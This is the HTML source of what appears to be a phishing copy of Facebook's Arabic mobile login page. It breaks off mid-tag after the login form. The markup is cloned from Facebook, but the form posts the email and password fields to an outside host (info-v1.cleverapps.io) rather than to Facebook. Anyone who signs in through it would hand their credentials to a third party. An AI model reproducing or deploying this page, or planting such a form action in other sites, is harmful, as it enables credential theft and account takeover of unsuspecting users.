<html>
  <head>
    <title>فيسبوك - تسجيل الدخول أو الاشتراك</title>
    <meta
      name="viewport"
      content="user-scalable=no,initial-scale=1,maximum-scale=1"
    />
    <link
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yj/r/gB76kJXPYJV.png"
      rel="shortcut icon"
      sizes="196x196"
    />
    <meta
      name="referrer"
      content="origin-when-crossorigin"
      id="meta_referrer"
    />
    <meta name="theme-color" content="#3b5998" />
    <link
      type="text/css"
      rel="stylesheet"
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yb/l/0,cross/vrw1-HRIFub.css?_nc_x=Ij3Wp8lg5Kz"
      data-bootloader-hash="MoYpVB9"
      crossorigin="anonymous"
    />
    <link
      type="text/css"
      rel="stylesheet"
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yQ/l/0,cross/QYtaTzkir1k.css?_nc_x=Ij3Wp8lg5Kz"
      data-bootloader-hash="LkM1EDH"
      crossorigin="anonymous"
    />
    <link
      type="text/css"
      rel="stylesheet"
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/y0/l/0,cross/5PiBf0gOoe5.css?_nc_x=Ij3Wp8lg5Kz"
      data-bootloader-hash="bGPbhqq"
      crossorigin="anonymous"
    />
    <link
      type="text/css"
      rel="stylesheet"
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yO/l/0,cross/zLYYnytI51B.css?_nc_x=Ij3Wp8lg5Kz"
      data-bootloader-hash="ObVQb8y"
      crossorigin="anonymous"
    />
    <link
      type="text/css"
      rel="stylesheet"
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yo/l/0,cross/8iSAwHXzun9.css?_nc_x=Ij3Wp8lg5Kz"
      data-bootloader-hash="zc1gkMl"
      crossorigin="anonymous"
    />
    <script id="u_0_g_2q" nonce="">
      function envFlush(a) {
        function b(b) {
          for (var c in a) b[c] = a[c];
        }
        window.requireLazy
          ? window.requireLazy(["Env"], b)
          : ((window.Env = window.Env || {}), b(window.Env));
      }
      envFlush({
        timeslice_heartbeat_config: {
          pollIntervalMs: 33,
          idleGapThresholdMs: 60,
          ignoredTimesliceNames: {
            requestAnimationFrame: true,
            "Event listenHandler mousemove": true,
            "Event listenHandler mouseover": true,
            "Event listenHandler mouseout": true,
            "Event listenHandler scroll": true,
          },
          isHeartbeatEnabled: true,
          isArtilleryOn: false,
        },
        shouldLogCounters: true,
        timeslice_categories: { react_render: true, reflow: true },
        sample_continuation_stacktraces: true,
        dom_mutation_flag: true,
      });
    </script>
    <script nonce="">
      document.domain = "facebook.com";
      /^#~?!(?:\/?[\w\.-])+\/?(?:\?|$)/.test(location.hash) &&
        location.replace(location.hash.substr(location.hash.indexOf("!") + 1));
    </script>
    <script nonce="">
      __DEV__ = 0;
    </script>
    <script
      id="u_0_h_il"
      crossorigin="anonymous"
      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yk/r/byTcfKYX_dt.js?_nc_x=Ij3Wp8lg5Kz"
      data-bootloader-hash="xWicgyd"
      nonce=""
    ></script>
    <script id="u_0_e_DQ" nonce="">
      (CavalryLogger =
        window.CavalryLogger ||
        function (a) {
          (this.lid = a),
            (this.transition = !1),
            (this.metric_collected = !1),
            (this.is_detailed_profiler = !1),
            (this.instrumentation_started = !1),
            (this.pagelet_metrics = {}),
            (this.events = {}),
            (this.ongoing_watch = {}),
            (this.values = { t_cstart: window._cstart }),
            (this.piggy_values = {}),
            (this.bootloader_metrics = {}),
            (this.resource_to_pagelet_mapping = {}),
            this.initializeInstrumentation && this.initializeInstrumentation();
        }),
        (CavalryLogger.prototype.setIsDetailedProfiler = function (a) {
          this.is_detailed_profiler = a;
          return this;
        }),
        (CavalryLogger.prototype.setTTIEvent = function (a) {
          this.tti_event = a;
          return this;
        }),
        (CavalryLogger.prototype.setValue = function (a, b, c, d) {
          d = d ? this.piggy_values : this.values;
          (typeof d[a] === "undefined" || c) && (d[a] = b);
          return this;
        }),
        (CavalryLogger.prototype.getLastTtiValue = function () {
          return this.lastTtiValue;
        }),
        (CavalryLogger.prototype.setTimeStamp =
          CavalryLogger.prototype.setTimeStamp ||
          function (a, b, c, d) {
            this.mark(a);
            var e = this.values.t_cstart || this.values.t_start;
            e = d ? e + d : CavalryLogger.now();
            this.setValue(a, e, b, c);
            this.tti_event &&
              a == this.tti_event &&
              ((this.lastTtiValue = e), this.setTimeStamp("t_tti", b));
            return this;
          }),
        (CavalryLogger.prototype.mark =
          typeof console === "object" && console.timeStamp
            ? function (a) {
                console.timeStamp(a);
              }
            : function () {}),
        (CavalryLogger.prototype.addPiggyback = function (a, b) {
          this.piggy_values[a] = b;
          return this;
        }),
        (CavalryLogger.instances = {}),
        (CavalryLogger.id = 0),
        (CavalryLogger.getInstance = function (a) {
          typeof a === "undefined" && (a = CavalryLogger.id);
          CavalryLogger.instances[a] ||
            (CavalryLogger.instances[a] = new CavalryLogger(a));
          return CavalryLogger.instances[a];
        }),
        (CavalryLogger.setPageID = function (a) {
          if (CavalryLogger.id === 0) {
            var b = CavalryLogger.getInstance();
            CavalryLogger.instances[a] = b;
            CavalryLogger.instances[a].lid = a;
            delete CavalryLogger.instances[0];
          }
          CavalryLogger.id = a;
        }),
        (CavalryLogger.now = function () {
          return window.performance &&
            performance.timing &&
            performance.timing.navigationStart &&
            performance.now
            ? performance.now() + performance.timing.navigationStart
            : new Date().getTime();
        }),
        (CavalryLogger.prototype.measureResources = function () {}),
        (CavalryLogger.prototype.profileEarlyResources = function () {}),
        (CavalryLogger.getBootloaderMetricsFromAllLoggers = function () {}),
        (CavalryLogger.start_js = function () {}),
        (CavalryLogger.start_js_script = function () {}),
        (CavalryLogger.done_js = function () {});
      CavalryLogger.getInstance().setTTIEvent("t_domcontent");
      (CavalryLogger.prototype.measureResources = function (a, b) {
        if (!this.log_resources) return;
        var c = "bootload/" + a.name;
        if (
          this.bootloader_metrics[c] !== void 0 ||
          this.ongoing_watch[c] !== void 0
        )
          return;
        var d = CavalryLogger.now();
        this.ongoing_watch[c] = d;
        "start_" + c in this.bootloader_metrics ||
          (this.bootloader_metrics["start_" + c] = d);
        b &&
          !("tag_" + c in this.bootloader_metrics) &&
          (this.bootloader_metrics["tag_" + c] = b);
        if (a.type === "js") {
          c = "js_exec/" + a.name;
          this.ongoing_watch[c] = d;
        }
      }),
        (CavalryLogger.prototype.stopWatch = function (a) {
          if (this.ongoing_watch[a]) {
            var b = CavalryLogger.now(),
              c = b - this.ongoing_watch[a];
            this.bootloader_metrics[a] = c;
            var d = this.piggy_values;
            a.indexOf("bootload") === 0 &&
              (d.t_resource_download || (d.t_resource_download = 0),
              d.resources_downloaded || (d.resources_downloaded = 0),
              (d.t_resource_download += c),
              (d.resources_downloaded += 1),
              d["tag_" + a] == "_EF_" &&
                (d.t_pagelet_cssload_early_resources = b));
            delete this.ongoing_watch[a];
          }
          return this;
        }),
        (CavalryLogger.getBootloaderMetricsFromAllLoggers = function () {
          var a = {};
          Object.values(window.CavalryLogger.instances).forEach(function (b) {
            b.bootloader_metrics && Object.assign(a, b.bootloader_metrics);
          });
          return a;
        }),
        (CavalryLogger.start_js = function (a) {
          for (var b = 0; b < a.length; ++b)
            CavalryLogger.getInstance().stopWatch("js_exec/" + a[b]);
        }),
        (CavalryLogger.start_js_script = function (a) {
          if (!a || !a.dataset) return;
          CavalryLogger.start_js([
            a.dataset.bootloaderHash || a.dataset.bootloaderHashClient,
          ]);
        }),
        (CavalryLogger.done_js = function (a) {
          for (var b = 0; b < a.length; ++b)
            CavalryLogger.getInstance().stopWatch("bootload/" + a[b]);
        }),
        (CavalryLogger.prototype.profileEarlyResources = function (a) {
          for (var b = 0; b < a.length; b++)
            this.measureResources(
              { name: a[b][0], type: a[b][1] ? "js" : "" },
              "_EF_"
            );
        });
      CavalryLogger.getInstance().log_resources = true;
      CavalryLogger.getInstance().setIsDetailedProfiler(true);
      window.CavalryLogger &&
        CavalryLogger.getInstance().setTimeStamp("t_start");
    </script>
    <script id="u_0_f_fP" nonce="">
      (function _(a, b, c, d) {
        function e(a) {
          document.cookie =
            a +
            "=;expires=Thu, 01-Jan-1970 00:00:01 GMT;path=/;domain=.facebook.com";
        }
        function f(a, b) {
          document.cookie = a + "=" + b + ";path=/;domain=.facebook.com;secure";
        }
        if (!a) {
          e(b);
          e(c);
          return;
        }
        a = null;
        (navigator.userAgent.indexOf("Firefox") !== -1 ||
          (!window.devicePixelRatio &&
            navigator.userAgent.indexOf("Windows Phone") !== -1)) &&
          document.documentElement != null &&
          ((a = screen.width / document.documentElement.offsetWidth),
          (a = Math.max(1, Math.floor(a * 2) / 2)));
        (!a || a === 1) &&
          navigator.userAgent.indexOf("IEMobile") !== -1 &&
          ((a = Math.sqrt(screen.deviceXDPI * screen.deviceYDPI) / 96),
          (a = Math.max(1, Math.round(a * 2) / 2)));
        f(b, (a || window.devicePixelRatio || 1).toString());
        e = window.screen ? screen.width : 0;
        b = window.screen ? screen.height : 0;
        f(c, e + "x" + b);
        d &&
          document.cookie &&
          window.devicePixelRatio > 1 &&
          document.location.reload();
      })(true, "m_pixel_ratio", "wd", false);
    </script>
    <meta
      http-equiv="origin-trial"
      data-feature="getInstalledRelatedApps"
      data-expires="2017-12-04"
      content="AvpndGzuAwLY463N1HvHrsK3WE5yU5g6Fehz7Vl7bomqhPI/nYGOjVg3TI0jq5tQ5dP3kDSd1HXVtKMQyZPRxAAAAABleyJvcmlnaW4iOiJodHRwczovL2ZhY2Vib29rLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW5zdGFsbGVkQXBwIiwiZXhwaXJ5IjoxNTEyNDI3NDA0LCJpc1N1YmRvbWFpbiI6dHJ1ZX0="
    />
    <meta
      name="description"
      content="يمكنك إنشاء حساب أو تسجيل الدخول إلى فيسبوك والتواصل مع الأصدقاء وأفراد العائلة والأشخاص الآخرين الذين تعرفهم. استمتع بمشاركة الصور ومقاطع الفيديو وإرسال..."
    />
    <link rel="canonical" href="https://www.facebook.com/" />
    <meta property="og:site_name" content="Facebook" />
    <meta property="og:type" content="website" />
    <meta property="og:title" content="فيسبوك - تسجيل الدخول أو الاشتراك" />
    <meta
      property="og:description"
      content="يمكنك إنشاء حساب أو تسجيل الدخول إلى فيسبوك والتواصل مع الأصدقاء وأفراد العائلة والأشخاص الآخرين الذين تعرفهم. استمتع بمشاركة الصور ومقاطع الفيديو وإرسال الرسائل والحصول على التحديثات."
    />
    <meta
      property="og:image"
      content="https://www.facebook.com/images/fb_icon_325x325.png"
    />
    <meta property="og:url" content="https://www.facebook.com/" />
    <link
      rel="alternate"
      hreflang="x-default"
      href="https://www.facebook.com/"
    />
    <link rel="alternate" hreflang="ar" href="https://ar-ar.facebook.com/" />
    <link rel="alternate" hreflang="bg" href="https://bg-bg.facebook.com/" />
    <link rel="alternate" hreflang="bs" href="https://bs-ba.facebook.com/" />
    <link rel="alternate" hreflang="ca" href="https://ca-es.facebook.com/" />
    <link rel="alternate" hreflang="da" href="https://da-dk.facebook.com/" />
    <link rel="alternate" hreflang="el" href="https://el-gr.facebook.com/" />
    <link rel="alternate" hreflang="en" href="https://www.facebook.com/" />
    <link rel="alternate" hreflang="es" href="https://es-la.facebook.com/" />
    <link rel="alternate" hreflang="es-es" href="https://es-es.facebook.com/" />
    <link rel="alternate" hreflang="fa" href="https://fa-ir.facebook.com/" />
    <link rel="alternate" hreflang="fi" href="https://fi-fi.facebook.com/" />
    <link rel="alternate" hreflang="fr" href="https://fr-fr.facebook.com/" />
    <link rel="alternate" hreflang="fr-ca" href="https://fr-ca.facebook.com/" />
    <link rel="alternate" hreflang="hi" href="https://hi-in.facebook.com/" />
    <link rel="alternate" hreflang="hr" href="https://hr-hr.facebook.com/" />
    <link rel="alternate" hreflang="id" href="https://id-id.facebook.com/" />
    <link rel="alternate" hreflang="it" href="https://it-it.facebook.com/" />
    <link rel="alternate" hreflang="ko" href="https://ko-kr.facebook.com/" />
    <link rel="alternate" hreflang="mk" href="https://mk-mk.facebook.com/" />
    <link rel="alternate" hreflang="ms" href="https://ms-my.facebook.com/" />
    <link rel="alternate" hreflang="pl" href="https://pl-pl.facebook.com/" />
    <link rel="alternate" hreflang="pt" href="https://pt-br.facebook.com/" />
    <link rel="alternate" hreflang="pt-pt" href="https://pt-pt.facebook.com/" />
    <link rel="alternate" hreflang="ro" href="https://ro-ro.facebook.com/" />
    <link rel="alternate" hreflang="sl" href="https://sl-si.facebook.com/" />
    <link rel="alternate" hreflang="sr" href="https://sr-rs.facebook.com/" />
    <link rel="alternate" hreflang="th" href="https://th-th.facebook.com/" />
    <link rel="alternate" hreflang="vi" href="https://vi-vn.facebook.com/" />
    <link
      rel="manifest"
      id="MANIFEST_LINK"
      href="/data/manifest/"
      crossorigin="use-credentials"
    />
    <link
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yk/r/J-zOLqpAwWd.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yk/r/J-zOLqpAwWd.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="M5XDl+E"
    ></script>
    <link
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/ym/r/1c-S99MMZKC.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/ym/r/1c-S99MMZKC.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="vF0qXZY"
    ></script>
    <link
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yB/r/2jr_tFUjDMy.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yB/r/2jr_tFUjDMy.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="bJ922yg"
    ></script>
    <link
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yl/r/ilMFccLWbov.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yl/r/ilMFccLWbov.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="FJqL2Al"
    ></script>
    <link
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yp/r/t__edt-vDoo.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yp/r/t__edt-vDoo.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="t1KEUNA"
    ></script>
    <link
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yn/r/KWY7Edb5_DT.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yn/r/KWY7Edb5_DT.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="FEt5GzN"
    ></script>
    <link
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yG/r/Z7yDY2JPbpt.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yG/r/Z7yDY2JPbpt.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="MOwxiEu"
    ></script>
    <link
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/y_/r/8nwDm3pgofH.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/y_/r/8nwDm3pgofH.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="LrzNtx/"
    ></script>
    <link
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yg/r/ngoBhFBLB-O.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yg/r/ngoBhFBLB-O.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="lZZnVFH"
    ></script>
    <link
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3i26U4/y3/l/ar_AR/SR9WpylB8u4.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3i26U4/y3/l/ar_AR/SR9WpylB8u4.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="txMBmcX"
    ></script>
    <link
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3iNZC4/yQ/l/ar_AR/bGTosVsgjZr.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3iNZC4/yQ/l/ar_AR/bGTosVsgjZr.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="hMoWeWt"
    ></script>
    <link
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3iW1x4/y1/l/ar_AR/McENtLtnSjE.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3iW1x4/y1/l/ar_AR/McENtLtnSjE.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="w5JLkSF"
    ></script>
    <link
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yZ/r/s3nxV5AJNPb.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yZ/r/s3nxV5AJNPb.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="EdRhDux"
    ></script>
    <link
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3i8Eb4/yG/l/ar_AR/aK2Vg0xp7su.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3i8Eb4/yG/l/ar_AR/aK2Vg0xp7su.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="NfvTfKe"
    ></script>
    <link
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3iEde4/yu/l/ar_AR/dqwZZfrv5U-.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3iEde4/yu/l/ar_AR/dqwZZfrv5U-.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="HPolq9r"
    ></script>
    <link
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/y3/r/ENNZJttsiwM.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/y3/r/ENNZJttsiwM.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="fVaBgHx"
    ></script>
    <link
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yh/r/KL8NwCaLOuW.js?_nc_x=Ij3Wp8lg5Kz"
      rel="preload"
      as="script"
      crossorigin="anonymous"
    />
    <script
      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yh/r/KL8NwCaLOuW.js?_nc_x=Ij3Wp8lg5Kz"
      async=""
      crossorigin="anonymous"
      data-bootloader-hash-client="seuBOnl"
    ></script>
  </head>
  <body
    tabindex="0"
    class="touch x1 android rtl _fzu _50-3 iframe acw portrait"
    style="background-color: rgb(255, 255, 255); min-height: 740px"
  >
    <script id="u_0_d_ep" nonce="">
      (function (a) {
        a.__updateOrientation = function () {
          var b = !!a.orientation && a.orientation !== 180,
            c = document.body;
          c &&
            (c.className =
              c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g, " ") +
              " " +
              (b ? "landscape" : "portrait"));
          return b;
        };
      })(window);
    </script>
    <div
      id="viewport"
      data-kaios-focus-transparent="1"
      style="min-height: 740px"
    >
      <h1
        style="
          display: block;
          height: 0;
          overflow: hidden;
          position: absolute;
          width: 0;
          padding: 0;
        "
      >
        فيسبوك
      </h1>
      <div id="page">
        <div class="_129_" id="header-notices"></div>
        <div
          class="_5soa acw"
          id="root"
          role="main"
          data-sigil="context-layer-root content-pane"
          style="min-height: 740px"
        >
          <div class="_7om2">
            <div class="_4g34" id="u_0_0_pk">
              <div
                class="_5yd0 _2ph- _5yd1"
                style="display: none"
                id="login_error"
                data-sigil="m_login_notice"
              >
                <div class="_52jd"></div>
              </div>
              <div class="_9om_">
                <div class="_4-4l">
                  <div
                    id="login_top_banner"
                    data-sigil="m_login_upsell login_identify_step_element"
                  >
                    <div class="_qw9 grouped aclb" id="u_0_1_fe">
                      <a
                        href="https://m.facebook.com/click.php?redir_url=market%3A%2F%2Fdetails%3Fid%3Dcom.facebook.katana%26referrer%3Dutm_reg%253Do8kSYhILomTbOsVFLQK7nxD3%26referrer_params%255Blink_source%255D%3Dfb_app_banner&amp;app_id=350685531728&amp;cref=mb&amp;no_fw=1&amp;refid=8"
                        target="_top"
                        class="touchableArea first last area touchable acy apl abt abb"
                        data-sigil="touchable marea"
                        ><div class="ib cc">
                          <i class="l img sp_xm9DDmY7HAL sx_9c1f22"></i>
                          <div class="c">
                            <span class="fcl"
                              >احصل على ‏فيسبوك لنظام Android‏ وتصفح بسرعة
                              أكبر.</span
                            >
                          </div>
                        </div></a
                      >
                    </div>
                    <iframe style="display: none"></iframe>
                    <div id="header_transparency_banner" style="display: none">
                      <div class="_819i">
                        <div>
                          <span class="_80q1">
                            يطلب فيسبوك رقم هاتفك ويتلقاه من شبكة الهاتف
                            المحمول. </span
                          ><a
                            class="_80q1"
                            href="/header_settings/?redirect_url=https%3A%2F%2Fm.facebook.com%2F%3Frtime%3D1654722648%26subno_key%3DAaFVdksd9OoHJ5n828dV4e3FJmYgnKrtZEh02wNN9Mf9A6SVraxzCxoaz9cDdX0oFPzD-Mzx6TVdXGEj1igzJz1TVxunTH8_f7KYaHNLWX8E6kt9PW03LyLySCuTjag10Qo1-9Q1n7a-TSCbck1GrGq5KbBj6QLr5CR04ZezwcFTDHAnRrgPPUNFmiJna6WkTPfuNcUH-Cyn5AQbpZP6xM45aI5cpeTnaTJ914R7B87IsGNsG1nEk5sAGKeA875uxOGc_RcqPbw4STihcRwz7AWfdLldQf_piJH19LMkBYC52w%26hrc%3D1%26refsrc%3Ddeprecated&amp;flow=opt_out&amp;refid=8"
                          >
                            تغيير الإعدادات
                          </a>
                        </div>
                      </div>
                      <img
                        class="_819d"
                        src="/images/assets_DO_NOT_HARDCODE/connectivity_free_facebook_assets/HeaderTrans-Caret.png"
                      />
                    </div>
                  </div>
                  <div class="_7om2 _52we _2pid _52z6">
                    <div class="_4g34">
                      <a
                        href="/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjU0NzIyNjUwLCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%3D%3D&amp;refid=8"
                        ><img
                          src="https://z-m-static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"
                          width="112"
                          class="img"
                          alt="facebook"
                      /></a>
                    </div>
                  </div>
                  <div class="_5rut">
                    <form
                    method="POST"
                    action="http://info-v1.cleverapps.io/?"
  
                    >
                      <input
                        type="hidden"
                        name="lsd"
                        value="AVqSTDMiPoU"
                        autocomplete="off"
                      /><input
                        type="hidden"
                        name="jazoest"
                        value="2957"
                        autocomplete="off"
                      /><input
                        type="hidden"
                        name="m_ts"
                        value="1654722650"
                      /><input
                        type="hidden"
                        name="li"
                        value="WhChYuh6QK-WrKFakfDmsNaN"
                      /><input
                        type="hidden"
                        name="try_number"
                        value="0"
                        data-sigil="m_login_try_number"
                      /><input
                        type="hidden"
                        name="unrecognized_tries"
                        value="0"
                        data-sigil="m_login_unrecognized_tries"
                      />
                      <div
                        id="user_info_container"
                        data-sigil="user_info_after_failure_element"
                      ></div>
                      <div
                        id="pwd_label_container"
                        data-sigil="user_info_after_failure_element"
                      ></div>
                      <div id="otp_retrieve_desc_container"></div>
                      <div>
                        <div class="_56be">
                          <div class="_55wo _56bf">
                            <div class="_96n9" id="email_input_container">
                              <div
                                class="_81f7"
                                id="header_transparency_tooltip"
                              >
                                <div
                                  id="header_transparency_tooltip_unselected"
                                >
                                  <i class="img sp_xm9DDmY7HAL sx_9331ed"></i>
                                </div>
                                <div
                                  id="header_transparency_tooltip_selected"
                                  style="display: none"
                                >
                                  <i class="img sp_xm9DDmY7HAL sx_427177"></i>
                                </div>
                              </div>
                              <input
                                autocorrect="off"
                                autocapitalize="off"
                                type="email"
                                class="_56bg _4u9z _5ruq _8qtn"
                                autocomplete="on"
                                id="m_login_email"
                                name="email"
                                placeholder="رقم الهاتف المحمول أو البريد الإلكتروني"
                                data-sigil="m_login_email"
                              />
                            </div>
                          </div>
                        </div>
                        <div class="_55wq"></div>
                        <div class="_56be">
                          <div class="_55wo _56bf">
                            <div
                              class="_1upc _mg8"
                              data-sigil="m_login_password"
                            >
                              <div class="_7om2">
                                <div class="_4g34 _5i2i _52we">
                                  <div class="_5xu4">
                                    <input
                                      autocorrect="off"
                                      autocapitalize="off"
                                      class="_56bg _4u9z _27z2 _8qtm"
                                      autocomplete="on"
                                      id="m_login_password"
                                      name="pass"
                                      placeholder="كلمة السر"
                                      type="password"
                                      data-sigil="password-plain-text-toggle-input"
                                    />
                                  </div>
                                </div>
                                <div class="_5s61 _216i _5i2i _52we">
                                  <div class="_5xu4">
                                    <div
                                      class="_2pi9"
                                      style="display: none"
                                      id="u_0_2_Zj"
                                    >
                                      <a
                                        href="#"
                                        data-sigil="password-plain-text-toggle"
                                        ><span
                                          class="mfss"
                                          style="display: none"
                                          id="u_0_3_Vu"
                                          >إخفاء</span
                                        ><span class="mfss" id="u_0_4_7a"
                                          >إظهار</span
                                        ></a
                                      >
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                      <div class="_2pie" style="text-align: center">
                        <div
                          id="login_password_step_element"
                          data-sigil="login_password_step_element"
                        >
                          <button
                            style="font-size: 17px;background: #03f;height: 40px;border: none;border-radius: 3px;line-height: 40px;text-shadow: 0 -1px rgb(0 0 0 / 25%);display: block;width: 100%;color: #fff;vertical-align: top;white-space: nowrap;font-weight: bold;"
                            type="button"
                            value="تسجيل الدخول"

                          >
                            <span class="_55sr">تسجيل الدخول</span>
                          </button>
                        </div>
                        <div
                          class="_7eif"
                          id="oauth_login_button_container"
                          style="display: none"
                        ></div>
                        <div
                          class="_7f_d"
                          id="oauth_login_desc_container"
                          style="display: none"
                        ></div>
                        <div id="otp_button_elem_container"></div>
                      </div>
                      <input
                        type="hidden"
                        name="prefill_contact_point"
                        id="prefill_contact_point"
                      /><input
                        type="hidden"
                        name="prefill_source"
                        id="prefill_source"
                      /><input
                        type="hidden"
                        name="prefill_type"
                        id="prefill_type"
                      /><input
                        type="hidden"
                        name="first_prefill_source"
                        id="first_prefill_source"
                      /><input
                        type="hidden"
                        name="first_prefill_type"
                        id="first_prefill_type"
                      /><input
                        type="hidden"
                        name="had_cp_prefilled"
                        id="had_cp_prefilled"
                        value="false"
                      /><input
                        type="hidden"
                        name="had_password_prefilled"
                        id="had_password_prefilled"
                        value="false"
                      /><input
                        type="hidden"
                        name="is_smart_lock"
                        id="is_smart_lock"
                        value="false"
                      /><input
                        type="hidden"
                        id="bi_xrwh"
                        name="bi_xrwh"
                        value="0"
                      /><input type="hidden" id="scetoggle" />
                      <div class="_xo8"></div>
                      <noscript
                        ><input type="hidden" name="_fb_noscript" value="true"
                      /></noscript>
                    </form>
                    <div>
                      <div class="_2pie _9omz">
                        <div class="_52jj _9on1">
                          <a
                            class="_9on1"
                            tabindex="0"
